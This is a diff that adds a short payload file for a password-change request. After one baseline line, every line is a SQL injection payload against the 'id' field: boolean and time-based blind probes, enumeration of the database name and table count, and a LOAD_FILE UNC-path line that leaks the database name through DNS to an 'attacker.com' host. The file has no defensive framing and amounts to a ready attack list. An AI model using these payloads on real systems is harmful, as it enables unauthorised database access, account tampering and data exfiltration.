@@ -1,0 +1,10 @@
+id=1&newpass=abc
+id=1' AND 1=1-- -&newpass=x
+id=1' AND 1=2-- -&newpass=abcs
+id=1' AND SLEEP(5)-- -&newpass=zzz
+id=1' AND IF(LENGTH(DATABASE())=8, SLEEP(5), 1)-- -&newpass=ok
+id=1' AND (SELECT COUNT(*) FROM users)=3-- -&newpass=abc
+id=1' AND IF(SUBSTRING(DATABASE(),1,1)='b',SLEEP(5),1)-- -&newpass=zzz
+id=1' AND IF(SUBSTRING(DATABASE(),2,1)='l',SLEEP(5),1)-- -&newpass=zzz
+id=1' AND IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=DATABASE())=3,SLEEP(5),1)-- -&newpass=zzz
+id=1' AND LOAD_FILE(CONCAT('\\\\',(SELECT DATABASE()),'.attacker.com\\abc'))-- -&newpass=zzz
